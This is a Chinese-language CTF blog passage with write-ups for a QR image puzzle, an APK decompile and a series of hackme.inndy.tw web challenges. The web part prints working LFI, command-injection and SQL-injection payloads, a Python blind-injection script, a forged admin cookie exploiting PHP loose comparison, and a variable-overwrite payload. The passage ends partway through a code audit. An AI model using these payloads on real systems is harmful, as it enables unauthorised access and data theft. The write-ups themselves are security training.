<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAARgAAAEYCAIAAAAI7H7bAAAFR0lEQVR4nO3dQY5bNxBAQU+Q+1/ZOUGIgHlqN2eqtoYljfQfuGiQ/Pr9+/cv4P/5609/APgOhAQBIUFASBAQEgSEBAEhQUBIEPj78G9fX19jnyOXD5onv43Dh7/7GPkLLnmvSecnyooEASFBQEgQEBIEhAQBIUFASBAQEgROA9mDJftq8wHf09PJux/l7hPmD8DrT5QVCQJCgoCQICAkCAgJAkKCgJAgICQIXA5kD5bMGQ/u5oyT08mD/YPL/XuTP/EdWpEgICQICAkCQoKAkCAgJAgICQJCgkA/kH1aPqs9WDK4XDLhfZ0VCQJCgoCQICAkCAgJAkKCgJAgICQI/MSB7ORxu3dD0qdPTv6ZrEgQEBIEhAQBIUFASBAQEgSEBAEhQaAfyH7XHZf5Ib2Tu3EP9v9e+z/hLysSJIQEASFBQEgQEBIEhAQBIUFASBC4HMg+va1y/22wk7PaJTfqPv1E/bIiQUJIEBASBIQEASFBQEgQEBIEhASBrye2H26wZAS5f9z5M58oKxIEhAQBIUFASBAQEgSEBAEhQUBIEBgdyOYjyMkXnNwuerDkvQ6efqKuWZEgICQICAkCQoKAkCAgJAgICQJCgsDokcWTd63evWBuyfHIB0tmmkuG9desSBAQEgSEBAEhQUBIEBASBIQEASFB4HIgu8TTF4/ezWon9wvn8g3Iex4AKxIEhAQBIUFASBAQEgSEBAEhQUBIEDgdWbzkQOA7k/tql2wX3e/pw6LPrEgQEBIEhAQBIUFASBAQEgSEBAEhQeC0Q3Zy0+LkPO7p85aXDH/3HxZ95/r3siJBQEgQEBIEhAQBIUFASBAQEgSEBIHLI4uX3N25ZFZ78PT8dMmv/MQlwlYkCAgJAkKCgJAgICQICAkCQoKAkCDwbe+QnRwm7t/4eWfJtmVHFsNPISQICAkCQoKAkCAgJAgICQJCgsDlHbJLdiYOD9022H+x73c9A9mRxfBxQoKAkCAgJAgICQJCgoCQICAkCPR3yN6ZvKF1cgS55Duc3BQ8OSXfM8a1IkFASBAQEgSEBAEhQUBIEBASBIQEgdNAdslJvN916prPT/P3WnJR7MGe04ytSBAQEgSEBAEhQUBIEBASBIQEASFBoL9DNp92LRm63b1gPnV9+pTm/SPj6yfKigQBIUFASBAQEgSEBAEhQUBIEBASBC7vkD1YMj+9s+Qo5oMlxyNPWnIusYEsfJyQICAkCAgJAkKCgJAgICQICAkC/Q7ZgyWTtUmTM+inL6U9eOLvsiJBQEgQEBIEhAQBIUFASBAQEgSEBIHTQHbJrtX9m0yXDC73f4w7kwcdX394KxIEhAQBIUFASBAQEgSEBAEhQUBIEDgNZJ/emjq5G3dywjtpzw2tFy84zIoEASFBQEgQEBIEhAQBIUFASBAQEgQujyx+emI4uZN0cl/t03t4J9/rE3+yFQkCQoKAkCAgJAgICQJCgoCQICAkCPR3yE7e+HlnydbUJbPa3J5dq//mE7+yFQkCQoKAkCAgJAgICQJCgoCQICAkCPQD2adNDkmX7DI+mPyTl5xm7A5Z+JOEBAEhQUBIEBASBIQEASFBQEgQ+IkD2SWT0HwEObmVeNKS7b3nr9eKBAEhQUBIEBASBIQEASFBQEgQEBIE+oHsknHnnckh6eG9Jg9VXvJeB/kO2U9cL2tFgoCQICAkCAgJAkKCgJAgICQICAkCX58YTm3w9G2wk/8r9/TI+JoVCQJCgoCQICAkCAgJAkKCgJAgICQInAaywH9kRYKAkCAgJAgICQJCgoCQICAkCAgJAkKCwD96oQOE684L1QAAAABJRU5ErkJggg=="</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>一看就是个base64编码的图片，解码一下是个二维码，扫码即可得到flag</p>
<p><img src="cumtctf/33.png" alt="answer"></p>
<p>这题还发现个stegdetect工具，收获挺大。</p>
<!-- flag{owid0-o91hf-9iahg} -->
<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="Gift"><a href="#Gift" class="headerlink" title="Gift"></a>Gift</h2><p>题目要让使用jeb，但是没找到工具，所以使用了kali下面的apktools，直接运行命令进行反编译</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d Gift.apk</span><br></pre></td></tr></table></figure>
<p>在Gift/smali/com/example/gift/flag.smail文件夹下面即可看到flag。</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hackme-web题解]]></title>
      <url>/2018/08/28/hackme/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近rootme网站好像有点问题，所以刷点hackme网站的题目，网址<a href="https://hackme.inndy.tw/" target="_blank" rel="noopener">https://hackme.inndy.tw/</a></p>
<a id="more"></a>
<h1 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h1><p>查看源代码</p>
<p><img src="hackme/1.png" alt=""></p>
<p>尝试读取</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>hackme.inndy.tw<span class="regexp">/lfi/</span>?page=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=pages<span class="regexp">/flag</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>Can you read the flag&lt;?php require(‘config.php’); ?&gt;?</p>
</blockquote>
<p>读取config即可得到flag</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>hackme.inndy.tw<span class="regexp">/lfi/</span>?page=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=pages<span class="regexp">/config</span></span><br></pre></td></tr></table></figure>
<h1 id="homepage"><a href="#homepage" class="headerlink" title="homepage"></a>homepage</h1><p>查看代码在结尾看到一个<code>cute.js</code>，跟踪一下，发现aaencode编码，丢在控制台执行即可得到二维码，扫描即可</p>
<h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><p>命令执行，我们可以使用 <code>$()</code> 或者 <code><code> </code></code> 都可以实现执行命令的作用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/ping/?ip=$(ls -a)</span><br></pre></td></tr></table></figure>
<p>然后访问flag.php文件，因为题目过滤flag和php关键字，还有cat等命令，我们可以尝试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/ping/?ip=$(tac *.*)</span><br></pre></td></tr></table></figure>
<h1 id="scoreboard"><a href="#scoreboard" class="headerlink" title="scoreboard"></a>scoreboard</h1><p>f12查看点击网络，查看一下消息头即可看到flag</p>
<h1 id="login-as-admin-0"><a href="#login-as-admin-0" class="headerlink" title="login as admin 0"></a>login as admin 0</h1><p>题目主要源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="comment">// table schema</span></span><br><span class="line"><span class="comment">// user -&gt; id, user, password, is_admin</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'show_source'</span>] === <span class="string">'1'</span>) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\'"</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line">$_POST = array_map(safe_filter, $_POST);</span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">// connect to database</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $connection_string = sprintf(<span class="string">'mysql:host=%s;dbname=%s;charset=utf8mb4'</span>, DB_HOST, DB_NAME);</span><br><span class="line">    $db = <span class="keyword">new</span> PDO($connection_string, DB_USER, DB_PASS);</span><br><span class="line">    $sql = sprintf(<span class="string">"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'"</span>,</span><br><span class="line">        $_POST[<span class="string">'name'</span>],</span><br><span class="line">        $_POST[<span class="string">'password'</span>]</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $query = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($query) &#123;</span><br><span class="line">            $user = $query-&gt;fetchObject();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $user = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $user = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>本题是一道sql注入题目，要求我们以admin身份登录，题目过滤部分如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $strl = strtolower($str);</span><br><span class="line">    <span class="keyword">if</span> (strstr($strl, <span class="string">'or 1=1'</span>) || strstr($strl, <span class="string">'drop'</span>) ||</span><br><span class="line">        strstr($strl, <span class="string">'update'</span>) || strstr($strl, <span class="string">'delete'</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">"'"</span>, <span class="string">"\\\\'"</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line">$_</span><br></pre></td></tr></table></figure>
<p>可以看到，题目过滤了 <code>or 1=1</code> 等字符，还会用反斜杠转义单引号，漏洞点就在于本题只转义引号，不转义其它字符，所以我们可以考虑用自己提交的反斜杠转义掉引号前面的反斜杠，这样引号就被脱出来了，于是我们可以成功闭合，另外由于题目转义了引号，我们在构造admin登录的时候，可以使用16进制绕过，最终payload如下</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">name</span>=guest\' <span class="keyword">or</span> <span class="attribute">user</span>=0x61646d696e-- +&amp;<span class="attribute">password</span>=guest</span><br></pre></td></tr></table></figure>
<h1 id="login-as-admin-0-1"><a href="#login-as-admin-0-1" class="headerlink" title="login as admin 0.1"></a>login as admin 0.1</h1><p>上个题目的加强版，直接union注入即可，最终payload如下</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">name</span>=guest\'  union select 1,the_f14g,3,3 <span class="keyword">from</span> h1dden_f14g-- +&amp;<span class="attribute">password</span>=123465</span><br></pre></td></tr></table></figure>
<h1 id="login-as-admin-1"><a href="#login-as-admin-1" class="headerlink" title="login as admin 1"></a>login as admin 1</h1><p>题目过滤并不严格，payload如下</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\'<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span>limit<span class="comment">/**/</span><span class="number">0</span>,<span class="number">1</span>#</span><br></pre></td></tr></table></figure>
<h1 id="login-as-admin-1-2"><a href="#login-as-admin-1-2" class="headerlink" title="login as admin 1.2"></a>login as admin 1.2</h1><p>上一题的加强版，需要进行盲注，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://hackme.inndy.tw/login1/index.php"</span></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload1 = r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#"</span></span><br><span class="line"><span class="comment"># database:login_as_admin1</span></span><br><span class="line"><span class="comment"># payload1 = r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;)#"</span></span><br><span class="line"><span class="comment"># tables: 0bdb54c98123f5526ccaed982d2006a9,users</span></span><br><span class="line"><span class="comment"># payload1 = r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x3062646235346339383132336635353236636361656439383264323030366139),&#123;&#125;,1))=&#123;&#125;)#"</span></span><br><span class="line"><span class="comment"># id,4a391a11cfa831ca740cf8d00782f3a6</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(4a391a11cfa831ca740cf8d00782f3a6)/**/from/**/0bdb54c98123f5526ccaed982d2006a9),&#123;&#125;,1))=&#123;&#125;)#"</span>	</span><br><span class="line">data = &#123;<span class="string">'name'</span>:<span class="string">r"guest\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)#"</span>, <span class="string">'password'</span>:<span class="string">"123"</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">70</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">		data[<span class="string">'name'</span>] = payload1.format(str(length),str(j))</span><br><span class="line">		content = requests.post(url,data=data).text</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"FLAG"</span> <span class="keyword">in</span> content:</span><br><span class="line">			flag += chr(j)</span><br><span class="line">			print(<span class="string">'**flag:**'</span>,flag)</span><br><span class="line">			length += <span class="number">1</span></span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h1 id="login-as-admin-3"><a href="#login-as-admin-3" class="headerlink" title="login as admin 3"></a>login as admin 3</h1><p>题目要求我们以admin身份登录，漏洞点在于验证登录时的判断使用了 <code>!=</code> ，这就存在弱比较的漏洞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_user</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $secret, $error;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE[<span class="string">'user'</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $unserialized = json_decode(base64_decode($_COOKIE[<span class="string">'user'</span>]), <span class="keyword">true</span>);</span><br><span class="line">    $r = hash_hmac(<span class="string">'sha512'</span>, $unserialized[<span class="string">'data'</span>], $secret) != $unserialized[<span class="string">'sig'</span>];</span><br><span class="line">    <span class="keyword">if</span>(hash_hmac(<span class="string">'sha512'</span>, $unserialized[<span class="string">'data'</span>], $secret) != $unserialized[<span class="string">'sig'</span>]) &#123;</span><br><span class="line">        $error = <span class="string">'Invalid session'</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data = json_decode($unserialized[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">'name'</span> =&gt; $data[<span class="number">0</span>],</span><br><span class="line">        <span class="string">'admin'</span> =&gt; $data[<span class="number">1</span>]</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们只要使$unserialized[‘sig’]的值为数字0即可绕过验证</p>
<p>那么我们构造一个cookie</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_user</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $user, $secret;</span><br><span class="line">    $user = [<span class="string">'admin'</span>, <span class="keyword">true</span>];</span><br><span class="line">    $data = json_encode($user);</span><br><span class="line">    $sig = <span class="number">0</span>;</span><br><span class="line">    $all = base64_encode(json_encode([<span class="string">'sig'</span> =&gt; $sig, <span class="string">'data'</span> =&gt; $data]));</span><br><span class="line">    <span class="keyword">return</span> $all;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> set_user();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后刷新即可</p>
<h1 id="login-as-admin-4"><a href="#login-as-admin-4" class="headerlink" title="login as admin 4"></a>login as admin 4</h1><p>题目存在逻辑漏洞，重定向之后并没有exit，所以导致最终的判断被执行，所以我们只需要提交name为admin即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d <span class="string">"name=admin"</span> https://hackme.inndy.tw/login4/</span><br></pre></td></tr></table></figure>
<h1 id="Login-as-Admin-6"><a href="#Login-as-Admin-6" class="headerlink" title="Login as Admin 6"></a>Login as Admin 6</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'data'</span>])) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $data = json_decode($_POST[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $data = [];</span><br><span class="line">    &#125;</span><br><span class="line">    extract($data);</span><br><span class="line">    <span class="keyword">if</span>($users[$username] &amp;&amp; strcmp($users[$username], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">        $user = $username;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看代码可知存在变量覆盖漏洞，构造json数据即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;<span class="string">"users"</span>:&#123;<span class="string">"admin"</span>:<span class="string">"snow"</span>&#125;,<span class="string">"username"</span>:<span class="string">"admin"</span>,<span class="string">"password"</span>:<span class="string">"snow"</span>&#125;</span><br></pre></td></tr></table></figure>
<h1 id="login-as-admin-7"><a href="#login-as-admin-7" class="headerlink" title="login as admin 7"></a>login as admin 7</h1><p>md5弱比较</p>
<p><img src="hackme/2.png" alt="payload"></p>
<h1 id="dafuq-manager-1"><a href="#dafuq-manager-1" class="headerlink" title="dafuq-manager 1"></a>dafuq-manager 1</h1><p>查看cookie可以发现 <strong><em>show_hidden</em></strong> 字段为 <strong><em>no</em></strong>，改为<strong><em>yes</em></strong>刷新即可得到flag</p>
<h1 id="dafuq-manager-2"><a href="#dafuq-manager-2" class="headerlink" title="dafuq-manager 2"></a>dafuq-manager 2</h1><p>这是一道代码审计，这是我第一次做这种整个网站源码的审计，还是有点被惊到了，万事开头难，看了别人的思路，我也开始了自己的审计之路，题目要求我们以admin的身份登录查看flag</p>
<p>推荐使用PHPstorm来审计这种代码，搜索定位函数和变量会方便一点，先查看入口文件index.php，找到了admin相关的部分</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">"admin"</span>:</span><br><span class="line">        <span class="keyword">require</span> <span class="string">"./core/fun_admin.php"</span>;</span><br><span class="line">        show_admin($GLOBALS[<span class="string">"dir"</span>]);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>我们跟进fun_admin.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_admin</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">    $pwd = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">2</span>) == <span class="number">2</span>);</span><br><span class="line">    $admin = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">4</span>) == <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span> (!$GLOBALS[<span class="string">"require_login"</span>]) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"miscnofunc"</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__GET'</span>][<span class="string">"action2"</span>])) $action2 = $GLOBALS[<span class="string">'__GET'</span>][<span class="string">"action2"</span>];</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="keyword">isset</span>($GLOBALS[<span class="string">'__POST'</span>][<span class="string">"action2"</span>])) $action2 = $GLOBALS[<span class="string">'__POST'</span>][<span class="string">"action2"</span>];</span><br><span class="line">    <span class="keyword">else</span> $action2 = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">switch</span> ($action2) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"chpwd"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$pwd) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            changepwd($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"adduser"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            adduser($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"edituser"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            edituser($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"rmuser"</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            removeuser($dir);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span> (!$pwd &amp;&amp; !$admin) show_error($GLOBALS[<span class="string">"error_msg"</span>][<span class="string">"accessfunc"</span>]);</span><br><span class="line">            admin($admin, $dir);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要的限制条件在于</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pwd = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">2</span>) == <span class="number">2</span>);</span><br><span class="line">$admin = (($GLOBALS[<span class="string">"permissions"</span>] &amp; <span class="number">4</span>) == <span class="number">4</span>);</span><br></pre></td></tr></table></figure>
<p>我们跟进这个变量看一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">activate_user</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    $data = find_user($user, $pass);</span><br><span class="line">    <span class="keyword">if</span> ($data == <span class="keyword">NULL</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    $GLOBALS[<span class="string">'__SESSION'</span>][<span class="string">"s_user"</span>] = $data[<span class="number">0</span>];</span><br><span class="line">    $GLOBALS[<span class="string">'__SESSION'</span>][<span class="string">"s_pass"</span>] = $data[<span class="number">1</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"home_dir"</span>] = $data[<span class="number">2</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"home_url"</span>] = $data[<span class="number">3</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"show_hidden"</span>] = $data[<span class="number">4</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"no_access"</span>] = $data[<span class="number">5</span>];</span><br><span class="line">    $GLOBALS[<span class="string">"permissions"</span>] = $data[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再定位到find_user()</p>
